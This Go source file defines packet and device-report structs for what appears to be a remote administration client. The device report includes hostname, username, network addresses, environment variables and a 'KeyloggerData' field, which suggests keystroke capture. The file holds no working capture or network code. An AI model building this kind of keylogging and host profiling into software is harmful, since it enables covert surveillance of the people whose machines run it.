package modules

import "reflect"

type Packet struct {
	Code  int            `json:"code"`
	Act   string         `json:"act,omitempty"`
	Msg   string         `json:"msg,omitempty"`
	Data  map[string]any `json:"data,omitempty"`
	Event string         `json:"event,omitempty"`
}

type CommonPack struct {
	Code  int    `json:"code"`
	Act   string `json:"act,omitempty"`
	Msg   string `json:"msg,omitempty"`
	Data  any    `json:"data,omitempty"`
	Event string `json:"event,omitempty"`
}

type Device struct {
	ID       string `json:"id"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	LAN      string `json:"lan"`
	WAN      string `json:"wan"`
	MAC      string `json:"mac"`
	Net      Net    `json:"net"`
	CPU      CPU    `json:"cpu"`
	RAM      IO     `json:"ram"`
	Disk     IO     `json:"disk"`
	Uptime   uint64 `json:"uptime"`
	Latency  uint   `json:"latency"`
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	ClientUptime int64 `json:"clientuptime"`
	PID          int   `json:"pid"`
	KeyloggerData []string `json:"keyloggerdata"`
	KeyboardLayout string `json:"keyboardlayout"`
}

type IO struct {
	Total uint64  `json:"total"`
	Used  uint64  `json:"used"`
	Usage float64 `json:"usage"`
}

type CPU struct {
	Model string  `json:"model"`
	Usage float64 `json:"usage"`
	Cores struct {
		Logical  int `json:"logical"`
		Physical int `json:"physical"`
	} `json:"cores"`
}

type Net struct {
	Sent uint64 `json:"sent"`
	Recv uint64 `json:"recv"`
}

type NetworkInterface struct {
	Name  string   `json:"name"`
	MAC   string   `json:"mac"`
	Flags []string `json:"flags"`
	Addrs []string `json:"addrs"`
}

type DeviceMetadata struct {
	// Identity
	ID       string `json:"id"`
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	// OS / platform
	OS              string `json:"os"`
	Arch            string `json:"arch"`
	Platform        string `json:"platform"`
	PlatformFamily  string `json:"platform_family"`
	PlatformVersion string `json:"platform_version"`
	KernelVersion   string `json:"kernel_version"`
	BootTime        uint64 `json:"boot_time"`
	Timezone        string `json:"timezone"`
	Virtualization  string `json:"virtualization"`
	// Network
	WAN        string             `json:"wan"`
	LAN        string             `json:"lan"`
	Interfaces []NetworkInterface `json:"interfaces"`
	// Hardware
	CPU  CPU    `json:"cpu"`
	RAM  IO     `json:"ram"`
	Disk IO     `json:"disk"`
	MAC  string `json:"mac"`
	// Client runtime
	PID          int    `json:"pid"`
	ClientUptime int64  `json:"client_uptime"`
	Commit       string `json:"commit"`
	// Logged-in users
	Users []string `json:"users"`
	// Selected environment variables
	Env map[string]string `json:"env"`
}

func (p *Packet) GetData(key string, t reflect.Kind) (any, bool) {
	if p.Data == nil {
		return nil, false
	}
	data, ok := p.Data[key]
	if !ok {
		return nil, false
	}
	switch t {
	case reflect.String:
		val, ok := data.(string)
		return val, ok
	case reflect.Uint:
		val, ok := data.(uint)
		return val, ok
	case reflect.Uint32:
		val, ok := data.(uint32)
		return val, ok
	case reflect.Uint64:
		val, ok := data.(uint64)
		return val, ok
	case reflect.Int:
		val, ok := data.(int)
		return val, ok
	case reflect.Int64:
		val, ok := data.(int64)
		return val, ok
	case reflect.Bool:
		val, ok := data.(bool)
		return val, ok
	case reflect.Float64:
		val, ok := data.(float64)
		return val, ok
	default:
		return nil, false
	}
}
